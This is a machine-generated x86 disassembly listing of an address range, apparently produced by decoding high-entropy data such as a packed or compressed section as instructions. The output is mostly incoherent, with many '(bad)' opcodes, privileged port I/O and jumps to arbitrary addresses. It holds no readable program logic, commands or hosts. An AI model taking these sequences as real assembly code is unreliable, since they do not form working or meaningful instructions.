  42856e:	lds    ecx,FWORD PTR [ecx-0x42]
  428571:	jbe    0x42852e
  428573:	jne    0x4285a9
  428575:	cmp    BYTE PTR [ebx-0x6da44c25],dh
  42857b:	adc    al,0x3c
  42857d:	add    eax,0x9f2a62c5
  428582:	xchg   ebp,eax
  428583:	(bad)  
  428584:	stc    
  428585:	jae    0x42853a
  428587:	pop    ebp
  428588:	(bad)  
  428589:	jnp    0x42854e
  42858b:	push   cs
  42858c:	mov    ecx,0xffbc0420
  428591:	addr16 dec eax
  428593:	aam    0x58
  428595:	or     ebp,eax
  428597:	cwde   
  428598:	jnp    0x428529
  42859a:	ds dec ebp
  42859c:	mov    bh,0xc3
  42859e:	ja     0x428558
  4285a0:	sbb    DWORD PTR [esi],ebx
  4285a2:	push   eax
  4285a3:	or     BYTE PTR [edx+ecx*4-0x59819b11],ch
  4285aa:	push   es
  4285ab:	jge    0x42856f
  4285ad:	jmp    0xefb2967e
  4285b2:	std    
  4285b3:	ss cmp eax,0xa668c900
  4285b9:	cmc    
  4285ba:	(bad)  
  4285bb:	adc    DWORD PTR cs:[ebp+esi*4+0x1792],edx
	...
  428633:	add    BYTE PTR [ecx],al
  428635:	push   esi
  428636:	nop
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	mov    WORD PTR [ecx-0x5363b667],?
  428646:	add    DWORD PTR [eax],eax
  428648:	cmc    
  428649:	add    BYTE PTR [eax],al
  42864b:	add    BYTE PTR [edx+0x58],bh
  42864e:	pop    ebp
  42864f:	push   ds
  428650:	or     eax,0xf45eda37
  428655:	aam    0xbd
  428657:	and    esp,esp
  428659:	dec    ebp
  42865a:	mov    ebx,0xd1e11df2
  42865f:	sbb    DWORD PTR [edi-0x47],esi
  428662:	jae    0x428678
  428664:	vpunpckldq ymm4,ymm7,YMMWORD PTR [esi-0x1e]
  428669:	mov    al,ds:0x4d6650e
  42866e:	popa   
  42866f:	sbb    eax,0x2f4d6ba0
  428674:	fcomp  st(5)
  428676:	ja     0x428681
  428678:	mov    esp,0xeaa97ec5
  42867d:	cmp    esi,edi
  42867f:	loope  0x428611
  428681:	sub    DWORD PTR [edx+0x4783a718],0x274c610e
  42868b:	loopne 0x4286b1
  42868d:	cmc    
  42868e:	cld    
  42868f:	sbb    eax,DWORD PTR [edx]
  428691:	inc    eax
  428692:	imul   ecx,esp,0xfffffffd
  428695:	mov    ds:0xcad0f612,eax
  42869a:	pop    ds
  42869b:	out    0xf4,eax
  42869d:	retf   
  42869e:	mov    al,0xc2
  4286a0:	(bad)  
  4286a1:	cmc    
  4286a2:	fs pop ecx
  4286a4:	and    eax,0x8be379f5
  4286a9:	daa    
  4286aa:	rcl    DWORD PTR [ecx+0x284dc9ec],0xec
  4286b1:	clc    
  4286b2:	inc    ebx
  4286b3:	jp     0x42870a
  4286b5:	test   eax,0xc86794ba
  4286ba:	stos   BYTE PTR es:[edi],al
  4286bb:	inc    edi
  4286bc:	xchg   ecx,eax
  4286bd:	mov    esi,0x95390498
  4286c2:	adc    dh,dh
  4286c4:	popf   
  4286c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286c6:	fnstenv [esi+0x1d5e307]
  4286cc:	add    eax,0xad9fb2a9
  4286d1:	pop    edi
  4286d2:	(bad)  
  4286d3:	test   eax,0x25d86b9c
  4286d8:	addr16 or dl,al
  4286db:	dec    esi
  4286dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286dd:	out    dx,eax
  4286de:	lahf   
  4286df:	jl     0x428740
  4286e1:	ds stos BYTE PTR es:[edi],al
  4286e3:	loop   0x428685
  4286e5:	jle    0x428705
  4286e7:	mov    bl,0xa3
  4286e9:	cmova  eax,DWORD PTR [esi-0x68]
  4286ed:	lods   al,BYTE PTR ds:[esi]
  4286ee:	jle    0x42870e
  4286f0:	aaa    
  4286f1:	ja     0x428766
  4286f3:	xor    al,0x63
  4286f5:	pop    ebp
  4286f6:	sbb    BYTE PTR [eax],cl
  4286f8:	sbb    dh,bl
  4286fa:	stc    
  4286fb:	dec    ecx
  4286fc:	sub    eax,0xd5c9cbfd
  428701:	add    BYTE PTR [ebp+edx*8-0x3f],dl
  428705:	(bad)  
  428706:	icebp  
  428707:	jb     0x4286e3
  428709:	(bad)  
  42870a:	aas    
  42870b:	dec    DWORD PTR [ebx+0x1]
  42870e:	loope  0x4286d1
  428710:	jae    0xa4590ab9
  428716:	jg     0x428736
  428718:	pop    eax
  428719:	mov    cl,0x21
  42871b:	or     eax,0xa3388aeb
  428720:	mov    cl,ah
  428722:	cs rol DWORD PTR gs:[esi+ebp*4+0x5],1
  428728:	sti    
  428729:	gs xchg edi,eax
  42872b:	and    DWORD PTR [edi],0x843860e2
  428731:	into   
  428732:	call   0xfe5d:0x69ef21bd
  428739:	or     al,0x16
  42873b:	ret    0x94b2
  42873e:	xchg   cl,al
  428740:	inc    ecx
	...
  4287b1:	add    BYTE PTR [eax],al
  4287b3:	add    BYTE PTR [edx],bl
  4287b5:	mov    cl,BYTE PTR [ebx]
  4287b7:	inc    ebp
  4287b8:	fwait
  4287b9:	lds    ebx,FWORD PTR [esi-0x21]
  4287bc:	xor    edi,DWORD PTR [edx-0x5cbed662]
  4287c2:	mov    edx,edx
  4287c4:	xchg   ecx,eax
  4287c5:	lods   eax,DWORD PTR ds:[esi]
  4287c6:	add    DWORD PTR [eax],eax
  4287c8:	cmc    
  4287c9:	add    BYTE PTR [eax],al
  4287cb:	add    BYTE PTR [edi+0x1e],dh
  4287ce:	mov    dl,0xc5
  4287d0:	push   edi
  4287d1:	cmp    eax,0xfbea90ed
  4287d6:	cmp    BYTE PTR [eax-0x35],bh
  4287d9:	xchg   BYTE PTR [edi+0x44c3fcef],ah
  4287df:	ja     0x42884f
  4287e1:	inc    esp
  4287e2:	or     esp,edi
  4287e4:	stos   BYTE PTR es:[edi],al
  4287e5:	fwait
  4287e6:	out    0x64,al
  4287e8:	push   edx
  4287e9:	test   al,0x38
  4287eb:	or     dl,dl
  4287ed:	jp     0x428868
  4287ef:	nop
  4287f0:	push   0xdba5befb
  4287f5:	fsubr  QWORD PTR [edx-0x12]
  4287f8:	gs pop ss
  4287fa:	cmp    BYTE PTR [esi+0x217caca6],ch
  428800:	int3   
  428801:	xor    eax,0x1adc7ead
  428806:	or     al,0xa2
  428808:	aas    
  428809:	inc    ecx
  42880a:	xor    BYTE PTR [esi-0x588c4f1a],bl
  428810:	cmp    esp,DWORD PTR [edi]
  428812:	(bad)  
  428813:	fmul   st,st(5)
  428815:	stos   BYTE PTR es:[edi],al
  428816:	sar    ah,1
  428818:	push   ebx
  428819:	push   edi
  42881a:	jae    0x428830
  42881c:	pop    edx
  42881d:	retf   
  42881e:	xchg   edi,eax
  42881f:	aad    0xd3
  428821:	hlt    
  428822:	adc    al,0x2f
  428824:	js     0x42889c
  428826:	leave  
  428827:	xchg   edx,eax
  428828:	dec    edi
  428829:	add    DWORD PTR ds:0xd925711f,edi
  42882f:	pop    esp
  428830:	jo     0x42888f
  428832:	mov    eax,0x80febe34
  428837:	ror    DWORD PTR [esi-0x69],0x39
  42883b:	nop
  42883c:	jle    0x42889d
  42883e:	adc    eax,0x84937360
  428843:	fdiv   st(4),st
  428845:	leave  
  428846:	repz hlt 
  428848:	sub    ah,ah
  42884a:	sahf   
  42884b:	addr16 inc edi
  42884d:	push   ebp
  42884e:	xchg   ebx,eax
  42884f:	push   ebx
  428850:	mov    edi,0xded75916
  428855:	mov    ch,0xc3
  428857:	pop    ebx
  428858:	pop    ebp
  428859:	push   ds
  42885a:	inc    edx
  42885b:	sub    DWORD PTR [ecx-0x356e3a05],ebx
  428861:	adc    DWORD PTR [edx-0x240e1e2a],ecx
  428867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428868:	psubsb mm7,QWORD PTR [edx+0x1249b84b]
  42886f:	loope  0x428866
  428871:	xchg   ebp,eax
  428872:	icebp  
  428873:	sbb    DWORD PTR [ebp+esi*1+0x6a],edx
  428877:	mov    BYTE PTR [ecx+0x7],dh
  42887a:	ins    BYTE PTR es:[edi],dx
  42887b:	push   0xb9e3d4e3
  428880:	(bad)  
  428881:	out    0x93,al
  428883:	call   DWORD PTR [ebx+0x76]
  428886:	aaa    
  428887:	xor    al,0xe5
  428889:	(bad)  
  42888a:	mov    esi,0xbfc6effb
  42888f:	and    DWORD PTR [eax],esi
  428891:	lods   eax,DWORD PTR ds:[esi]
  428892:	retf   0x7da9
  428895:	mov    dh,0xe1
  428897:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  428899:	div    BYTE PTR [esi+eiz*8-0x549e1b99]
  4288a0:	ja     0x428874
  4288a2:	and    al,0xc2
  4288a4:	scas   eax,DWORD PTR es:[edi]
  4288a5:	lods   eax,DWORD PTR ds:[esi]
  4288a6:	or     esi,ebp
  4288a8:	cmp    bl,BYTE PTR [ecx+0x563be8e]
  4288ae:	or     bh,cl
  4288b0:	(bad)  
  4288b1:	xchg   esi,eax
  4288b2:	std    
  4288b3:	lahf   
  4288b4:	mov    esi,0xc6621fd6
  4288b9:	mov    BYTE PTR [edi-0xc],al
  4288bc:	pop    esp
  4288bd:	pop    esp
  4288be:	outs   dx,BYTE PTR ds:[esi]
  4288bf:	push   0xffffff89
	...
  428931:	add    BYTE PTR [eax],al
  428933:	add    BYTE PTR [edx-0x5c0023],bl
  428939:	mov    ds:0x79f8fdde,eax
  42893e:	ja     0x42892a
  428940:	data16 in al,0xe3
  428943:	xor    BYTE PTR [esi-0xafffe52],al
  428949:	add    BYTE PTR [eax],al
  42894b:	add    BYTE PTR [esi+edi*8+0x15d3ea4b],cl
  428952:	or     dh,ch
  428954:	cdq    
  428955:	pop    es
  428956:	cs dec edx
  428958:	and    eax,0xab864457
  42895d:	dec    ecx
  42895e:	jno    0x428988
  428960:	mov    esi,0x11197de0
  428965:	pop    esp
  428966:	adc    eax,DWORD PTR [esi+0x26deaf13]
  42896c:	dec    esi
  42896d:	test   eax,0x59dd0ca8
  428972:	pop    es
  428973:	xor    DWORD PTR [esi+0x257b9ac4],ebx
  428979:	call   0xc49885cb
  42897e:	mov    ebp,0x6276787b
  428983:	sahf   
  428984:	xor    ebx,DWORD PTR [edi-0xa]
  428987:	sbb    edx,DWORD PTR [eax-0xc]
  42898a:	outs   dx,DWORD PTR ds:[esi]
  42898b:	add    esi,esi
  42898d:	push   ss
  42898e:	loope  0x4289bf
  428990:	pushf  
  428991:	mov    eax,0x1ed776c5
  428996:	cmp    al,0x7f
  428998:	ret    
  428999:	aaa    
  42899a:	jne    0x428942
  42899c:	scas   eax,DWORD PTR es:[edi]
  42899d:	and    eax,0xe82c9663
  4289a2:	scas   eax,DWORD PTR es:[edi]
  4289a3:	retf   0xd824
  4289a6:	mov    DWORD PTR [edx],esi
  4289a8:	xchg   ebx,eax
  4289a9:	fdivr  DWORD PTR [esi+0x30]
  4289ac:	dec    esp
  4289ad:	test   DWORD PTR [edi-0x9],esi
  4289b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289b1:	addr16 sti 
  4289b3:	push   ss
  4289b4:	lds    edi,FWORD PTR [ebp-0xd]
  4289b7:	fwait
  4289b8:	xchg   ecx,eax
  4289b9:	enter  0xd601,0x44
  4289bd:	fsubr  QWORD PTR [edx]
  4289bf:	add    ch,ah
  4289c1:	in     al,0xbc
  4289c3:	mov    al,ds:0x2090cc55
  4289c8:	addr16 pop ss
  4289ca:	mov    al,0xaa
  4289cc:	jg     0x428a0c
  4289ce:	popf   
  4289cf:	sbb    eax,0xf65fe814
  4289d4:	ins    DWORD PTR es:[edi],dx
  4289d5:	add    BYTE PTR [edx],dh
  4289d7:	dec    ebp
  4289d8:	loop   0x428960
  4289da:	(bad)  
  4289db:	mov    bl,0xc9
  4289dd:	and    ax,0xa895
  4289e1:	sahf   
  4289e2:	push   edi
  4289e3:	or     eax,DWORD PTR [edi+0x6a5b52bd]
  4289e9:	mov    al,ds:0xa3b1f043
  4289ee:	pop    ebp
  4289ef:	fstp   DWORD PTR [edi+0x6188b516]
  4289f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289f6:	dec    ebp
  4289f7:	int    0x6b
  4289f9:	ret    0xd38
  4289fc:	mov    esp,0x49273546
  428a01:	aad    0x3e
  428a03:	adc    DWORD PTR [edx-0x2e],esp
  428a06:	pop    ebp
  428a07:	mov    bl,0x99
  428a09:	inc    esi
  428a0a:	xchg   ebx,eax
  428a0b:	stos   DWORD PTR es:[edi],eax
  428a0c:	jno    0x4289ca
  428a0e:	mov    edi,0x3ee44dda
  428a13:	xchg   BYTE PTR [ebp-0x48],ch
  428a16:	ins    BYTE PTR es:[edi],dx
  428a17:	sub    al,0xbc
  428a19:	mov    ch,0xc4
  428a1b:	dec    esp
  428a1c:	aaa    
  428a1d:	int3   
  428a1e:	arpl   WORD PTR [ecx+ecx*2-0x76b96d49],ax
  428a25:	lea    edx,[esi]
  428a27:	shl    DWORD PTR [edi+0x2a04735f],cl
  428a2d:	shl    BYTE PTR [esi-0x8e5536e],1
  428a33:	repz add bh,bh
  428a36:	sub    ebx,DWORD PTR [edi+eiz*8]
  428a39:	add    al,0xbb
  428a3b:	sbb    edx,edi
  428a3d:	xchg   esi,eax
  428a3e:	pop    esp
  428a3f:	jnp    0x428a22
	...
  428ab1:	add    BYTE PTR [eax],al
  428ab3:	add    dl,cl
  428ab5:	mov    edx,DWORD PTR [edx+0x7b]
  428ab8:	push   ebx
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0x2bc2f691
  428ac2:	pop    esi
  428ac3:	clc    
  428ac4:	jnp    0x428a75
  428ac6:	add    DWORD PTR [eax],eax
  428ac8:	cmc    
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    BYTE PTR [edi],cl
  428acd:	sbb    BYTE PTR [eax-0x3a],dh
  428ad0:	outs   dx,DWORD PTR ds:[esi]
  428ad1:	adc    eax,0x52775174
  428ad6:	xchg   ebx,eax
  428ad7:	xchg   ebx,eax
  428ad8:	ja     0x428b23
  428ada:	add    eax,0x39e2a364
  428adf:	call   0xb6d842bf
  428ae4:	das    
  428ae5:	retf   0x216a
  428ae8:	mov    esp,edi
  428aea:	in     al,0x4e
  428aec:	jbe    0x428b50
  428aee:	push   DWORD PTR [edi]
  428af0:	jae    0x428b2a
  428af2:	sbb    eax,0xf4407629
  428af7:	sub    DWORD PTR [ecx],ebp
  428af9:	push   es
  428afa:	repz in eax,0x30
  428afd:	cwde   
  428afe:	rol    DWORD PTR [esi],1
  428b00:	or     ebp,ecx
  428b02:	mov    WORD PTR [ebp+0x479f35bc],es
  428b08:	add    esi,DWORD PTR [ebp+0x29]
  428b0b:	dec    eax
  428b0c:	fnstcw WORD PTR [edx+0x6c]
  428b0f:	push   0x4006e1db
  428b14:	push   ebx
  428b15:	je     0x428b2b
  428b17:	rol    DWORD PTR [ebp+esi*4-0x7e],0xb3
  428b1c:	(bad)  
  428b1d:	aad    0x49
  428b1f:	jg     0x428b51
  428b21:	lahf   
  428b22:	cld    
  428b23:	sbb    cl,dh
  428b25:	inc    edx
  428b26:	mov    al,0x5b
  428b28:	cmp    cl,ch
  428b2a:	inc    esp
  428b2b:	mov    bh,0xa
  428b2d:	and    DWORD PTR [eax-0x72],ecx
  428b30:	fcmovu st,st(2)
  428b32:	call   0xd8ff:0xc8403be4
  428b39:	cmp    DWORD PTR ss:[ebp-0x19],edi
  428b3d:	ds leave 
  428b3f:	leave  
  428b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b41:	arpl   WORD PTR [ebp-0x27],ax
  428b44:	fisttp WORD PTR [ebx-0xb1e9dff]
  428b4a:	hlt    
  428b4b:	fnstcw WORD PTR [esi]
  428b4d:	xor    ecx,edx
  428b4f:	add    ebp,DWORD PTR ds:[eax]
  428b52:	jmp    0x428b74
  428b54:	cs (bad) 
  428b56:	iret   
  428b57:	jb     0x428b6c
  428b59:	(bad)  
  428b5a:	fcomp  QWORD PTR [eax-0x23302498]
  428b60:	ror    DWORD PTR [edi],cl
  428b62:	mov    al,0x74
  428b64:	scas   al,BYTE PTR es:[edi]
  428b65:	int    0x81
  428b67:	xchg   ebx,eax
  428b68:	jg     0x428b7d
  428b6a:	pop    edx
  428b6b:	dec    esp
  428b6c:	out    dx,eax
  428b6d:	cwde   
  428b6e:	cmp    dl,ah
  428b70:	in     al,0x9b
  428b72:	push   edx
  428b73:	(bad)  
  428b74:	sbb    dl,BYTE PTR [ebx-0xde2271f]
  428b7a:	and    DWORD PTR [edi+edx*8+0x7c],eax
  428b7e:	xor    BYTE PTR [esi],dl
  428b80:	js     0x428b8b
  428b82:	mov    cl,0x89
  428b84:	fld    st(7)
  428b86:	ds pop es
  428b88:	xchg   ebp,eax
  428b89:	aaa    
  428b8a:	add    DWORD PTR [ebp+0x2bfd3ccd],ebx
  428b90:	nop
  428b91:	mov    cl,0x57
  428b93:	in     al,dx
  428b94:	test   al,0x8e
  428b96:	in     eax,dx
  428b97:	das    
  428b98:	mov    ah,0x73
  428b9a:	ja     0x428b7c
  428b9c:	fimul  DWORD PTR [edi]
  428b9e:	pop    edi
  428b9f:	hlt    
  428ba0:	daa    
  428ba1:	arpl   WORD PTR [ebx-0x50],dx
  428ba4:	or     BYTE PTR [ecx+edi*1-0x6752911e],dl
  428bab:	xchg   edx,eax
  428bac:	inc    esp
  428bad:	js     0x428b44
  428baf:	cli    
  428bb0:	repnz xchg ebp,eax
  428bb2:	push   esp
  428bb3:	or     esp,esi
  428bb5:	cwde   
  428bb6:	xchg   edx,eax
  428bb7:	mov    BYTE PTR [ebp-0x32003e59],ch
  428bbd:	mov    ch,0x85
  428bbf:	(bad)
	...
  428c33:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x2ed7a28f
  428c41:	or     edx,DWORD PTR [esi]
  428c43:	and    dh,BYTE PTR [eax-0x50]
  428c46:	add    DWORD PTR [eax],eax
  428c48:	cmc    
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    dl,bh
  428c4d:	fstp   TBYTE PTR [eax+0x2b7b85d0]
  428c53:	shl    bh,0x4e
  428c56:	fs mov bh,0x13
  428c59:	aas    
  428c5a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  428c5c:	test   DWORD PTR es:[ecx-0x6c],ebx
  428c60:	xchg   edi,eax
  428c61:	loop   0x428c67
  428c63:	repz adc esp,DWORD PTR [ebx]
  428c66:	push   ebp
  428c67:	dec    eax
  428c68:	pop    ds
  428c69:	cs dec esp
  428c6b:	mov    esp,0xd7467e0
  428c70:	fsub   st(7),st
  428c72:	enter  0x3e82,0x4
  428c76:	mov    DWORD PTR [ecx-0x45],esi
  428c79:	ja     0x428cca
  428c7b:	mov    eax,ds:0xe22e7b0e
  428c80:	dec    eax
  428c81:	pusha  
  428c82:	pop    ebx
  428c83:	mov    ds:0x8068f745,al
  428c88:	or     BYTE PTR [ecx-0x50],0xb1
  428c8c:	adc    eax,0x3a92782
  428c91:	in     eax,0xdc
  428c93:	sti    
  428c94:	dec    eax
  428c95:	jle    0x428cb6
  428c97:	sub    edi,DWORD PTR [edi+0x52]
  428c9a:	xor    al,0xd3
  428c9c:	sti    
  428c9d:	push   ebx
  428c9e:	outs   dx,DWORD PTR ds:[si]
  428ca0:	pushf  
  428ca1:	int3   
  428ca2:	arpl   WORD PTR [edi],di
  428ca4:	jmp    0x93b59a63
  428ca9:	stc    
  428caa:	mov    eax,ds:0x75f1e7df
  428caf:	lods   eax,DWORD PTR ds:[esi]
  428cb0:	jp     0x428c45
  428cb2:	out    0x97,al
  428cb4:	adc    ebx,DWORD PTR [esi]
  428cb6:	cmp    eax,DWORD PTR ds:0x6051d762
  428cbc:	sbb    BYTE PTR [ebx],ch
  428cbe:	leave  
  428cbf:	cwde   
  428cc0:	push   0x8c83fdd9
  428cc5:	int3   
  428cc6:	out    0x76,eax
  428cc8:	dec    eax
  428cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428cca:	adc    al,0xdc
  428ccc:	cmp    ebx,ebp
  428cce:	jno    0x428cf4
  428cd0:	popf   
  428cd1:	dec    ecx
  428cd2:	and    al,0x27
  428cd4:	hlt    
  428cd5:	pop    ebp
  428cd6:	inc    esp
  428cd7:	jae    0x428cac
  428cd9:	add    edx,esi
  428cdb:	xchg   edx,eax
  428cdc:	add    ch,BYTE PTR [ebx-0x59]
  428cdf:	stos   DWORD PTR es:[edi],eax
  428ce0:	ror    edx,0x9
  428ce3:	or     BYTE PTR [ecx-0x279b698e],0x1
  428cea:	jge    0x428cf1
  428cec:	mov    bl,BYTE PTR [eax+0x333755d2]
  428cf2:	sbb    eax,0x829394b2
  428cf7:	jmp    0x428c7a
  428cf9:	je     0x428c83
  428cfb:	dec    esi
  428cfc:	outs   dx,DWORD PTR ds:[esi]
  428cfd:	dec    esi
  428cfe:	rcr    BYTE PTR [ebx+0x34],cl
  428d01:	xchg   ebp,eax
  428d02:	adc    al,0xd7
  428d04:	push   esi
  428d05:	dec    ebx
  428d06:	and    al,cl
  428d08:	or     edx,esp
  428d0a:	adc    al,0xfa
  428d0c:	ret    
  428d0d:	mov    eax,ds:0xbeb97463
  428d12:	cmp    DWORD PTR [ebx],edi
  428d14:	push   edi
  428d15:	or     al,0xc1
  428d17:	mov    ds:0x24551642,al
  428d1c:	adc    BYTE PTR [esp+eax*2+0x155c55fa],bh
  428d23:	inc    ecx
  428d24:	les    edi,FWORD PTR [ebp-0x18]
  428d27:	stc    
  428d28:	leave  
  428d29:	or     DWORD PTR [ecx],0xffffffe0
  428d2c:	xchg   edi,eax
  428d2d:	mov    dh,0x4d
  428d2f:	loopne 0x428d4d
  428d31:	pop    edi
  428d32:	inc    edx
  428d33:	pop    ebx
  428d34:	ds pop esp
  428d36:	sub    BYTE PTR [ecx-0x19c8fad5],0x50
  428d3d:	imul   ebx,DWORD PTR [ebx+0x79ac],0x0
	...
  428db4:	mov    eax,0x6d3c25f1
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0x8985d837
  428dc4:	gs mov cl,0x1
  428dc7:	add    ch,dh
  428dc9:	add    BYTE PTR [eax],al
  428dcb:	add    BYTE PTR [eax+ebx*2],bl
  428dce:	rcl    ah,cl
  428dd0:	addr16 mov eax,0xcbd96a3a
  428dd6:	(bad)
  428dd9:	xor    eax,0x97b71b47
  428dde:	in     al,dx
  428ddf:	and    BYTE PTR [ecx+0x27],dh
  428de2:	sbb    al,cl
  428de4:	push   cs
  428de5:	sbb    BYTE PTR [esp+ebp*8],dl
  428de8:	ds js  0x428dd6
  428deb:	cmp    dh,BYTE PTR [ecx+0x35]
  428dee:	aam    0x19
  428df0:	push   0xffffffa2
  428df2:	and    al,0xa4
  428df4:	repnz or eax,0x553722b
  428dfa:	daa    
  428dfb:	mov    eax,0xef06f175
  428e00:	ds ret 0xaec6
  428e04:	jmp    0x7e771134
  428e09:	pop    ecx
  428e0a:	lock sub BYTE PTR [esi+0x2a],ah
  428e0e:	mov    edi,0xad11a338
  428e13:	pusha  
  428e14:	add    dh,ch
  428e16:	xchg   edx,eax
  428e17:	fidivr DWORD PTR [ecx-0x43]
  428e1a:	sub    BYTE PTR [ebx-0x561b1827],0xc3
  428e21:	js     0x428e22
  428e23:	pop    ecx
  428e24:	mov    ecx,0xaed42853
  428e29:	push   esi
  428e2a:	mov    dh,0x84
  428e2c:	jmp    DWORD PTR [esp+eiz*2-0x580e200e]
  428e33:	dec    eax
  428e34:	jg     0x428e37
  428e36:	adc    dl,ch
  428e38:	ins    BYTE PTR es:[edi],dx
  428e39:	mov    dl,BYTE PTR [ecx+eiz*4+0x2814af17]
  428e40:	loopne 0x428ea2
  428e42:	ins    DWORD PTR es:[edi],dx
  428e43:	out    dx,eax
  428e44:	push   esp
  428e45:	aad    0xff
  428e47:	retf   0xa7ea
  428e4a:	jg     0x428dd8
  428e4c:	loopne 0x428e4e
  428e4e:	stos   DWORD PTR es:[edi],eax
  428e4f:	das    
  428e50:	pop    DWORD PTR [ebp-0xa]
  428e53:	sub    eax,0x75116063
  428e58:	out    0xe7,al
  428e5a:	dec    esp
  428e5b:	jb     0x428e15
  428e5d:	retf   0x4daa
  428e60:	push   edi
  428e61:	icebp  
  428e62:	int    0x7a
  428e64:	pop    ss
  428e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e66:	pop    esp
  428e67:	inc    esp
  428e68:	adc    bl,BYTE PTR [esi]
  428e6a:	(bad)  
  428e6b:	(bad)  [eax]
  428e6d:	or     al,0xb1
  428e6f:	mov    BYTE PTR [ebx],bh
  428e71:	mov    BYTE PTR [edi-0xf],ch
  428e74:	push   edi
  428e75:	iret   
  428e76:	xchg   ecx,eax
  428e77:	jp     0x428e92
  428e79:	xor    dx,WORD PTR [edx+0x7c]
  428e7d:	pop    es
  428e7e:	pop    edi
  428e7f:	inc    ebp
  428e80:	mov    dh,0x25
  428e82:	xor    BYTE PTR [edx],cl
  428e84:	cwde   
  428e85:	pop    ss
  428e86:	repnz fnsave [esi]
  428e89:	cs push ds
  428e8b:	pushf  
  428e8c:	dec    edi
  428e8d:	cmc    
  428e8e:	pop    es
  428e8f:	call   0xab211a96
  428e94:	loop   0x428ed1
  428e96:	stos   BYTE PTR es:[edi],al
  428e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e99:	loop   0x428ed9
  428e9b:	and    al,0xda
  428e9d:	mov    BYTE PTR [ebp+0x4a],cl
  428ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ea1:	imul   edi,DWORD PTR [ebx+0x13],0xada204a8
  428ea8:	out    0x12,eax
  428eaa:	cwde   
  428eab:	push   es
  428eac:	(bad)  [ecx-0x63d4c336]
  428eb2:	push   ebx
  428eb3:	fs aaa 
  428eb5:	aas    
  428eb6:	sbb    BYTE PTR [edi+0xbff8507],0x7f
  428ebd:	xor    eax,0xe7b1b8
	...
  428f32:	add    BYTE PTR [eax],al
  428f34:	mov    cl,0xa7
  428f36:	dec    ebx
  428f37:	das    
  428f38:	pop    edi
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	jecxz  0x428f1b
  428f42:	cmp    edx,DWORD PTR [eax+0x1b25a]
  428f48:	cmc    
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    BYTE PTR [eax-0x71],dl
  428f4e:	fs test al,0xfc
  428f51:	jle    0xfc4b272b
  428f57:	cmp    eax,0xac64084d
  428f5c:	rcl    DWORD PTR [ecx],1
  428f5e:	mov    ?,WORD PTR [eax]
  428f60:	adc    cl,BYTE PTR [edi]
  428f62:	xchg   edi,eax
  428f63:	jo     0x428f47
  428f65:	push   ecx
  428f66:	sti    
  428f67:	xlat   BYTE PTR ds:[ebx]
  428f68:	cmp    BYTE PTR [esi],cl
  428f6a:	fisub  DWORD PTR [edx-0x1e9b6130]
  428f70:	inc    esi
  428f71:	pop    ebp
  428f72:	into   
  428f73:	jp     0x428fca
  428f75:	in     eax,0xc7
  428f77:	pop    ecx
  428f78:	mov    cl,0xb8
  428f7a:	rcl    ah,1
  428f7c:	fdivr  QWORD PTR [edi]
  428f7e:	cmp    edx,DWORD PTR cs:[edx]
  428f81:	mov    fs,ebp
  428f83:	outs   dx,BYTE PTR ds:[esi]
  428f84:	loopne 0x428f98
  428f86:	ret    0xb8ed
  428f89:	dec    esi
  428f8a:	mov    DWORD PTR [ebp+ebp*4+0x20],esi
  428f8e:	or     al,0x11
  428f90:	jg     0x428fc4
  428f92:	fistp  DWORD PTR es:[esi+eiz*2-0x8fb12c9]
  428f9a:	iret   
  428f9b:	outs   dx,DWORD PTR ds:[esi]
  428f9c:	sbb    ecx,edx
  428f9e:	mov    eax,ds:0x7fc5965
  428fa3:	add    al,0x21
  428fa5:	(bad)  
  428fa6:	xor    eax,edi
  428fa8:	scas   al,BYTE PTR es:[edi]
  428fa9:	out    dx,eax
  428faa:	sub    esp,edi
  428fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fad:	sbb    al,0x32
  428faf:	mov    eax,0xaeb54517
  428fb4:	sbb    eax,esp
  428fb6:	push   ecx
  428fb7:	rol    cl,cl
  428fb9:	mov    al,0x34
  428fbb:	jnp    0x428f51
  428fbd:	xor    eax,0xba6a38c
  428fc2:	loope  0x428fbf
  428fc4:	adc    al,0xaf
  428fc6:	adc    eax,DWORD PTR [edx-0x1]
  428fc9:	inc    esp
  428fca:	aad    0x36
  428fcc:	test   DWORD PTR [ebx+esi*8+0x13],0xe07ed181
  428fd4:	or     edi,DWORD PTR [eax+0x29559626]
  428fda:	dec    ebp
  428fdb:	mov    dl,0xc2
  428fdd:	enter  0x82b7,0x8f
  428fe1:	push   0xfb02e7e2
  428fe6:	jb     0x429024
  428fe8:	dec    edi
  428fe9:	jae    0x429068
  428feb:	test   BYTE PTR [eax+eax*8-0x42],ch
  428fef:	outs   dx,BYTE PTR ds:[esi]
  428ff0:	sbb    BYTE PTR [eax-0x6a3fb40b],al
  428ff6:	sbb    al,0x6f
  428ff8:	sub    BYTE PTR [eax-0x4cf30d41],bh
  428ffe:	push   0x7b4eb29b
  429003:	push   ebp
  429004:	addr16 ds test ebp,ebp
  429008:	pop    edx
  429009:	mov    ebx,ebx
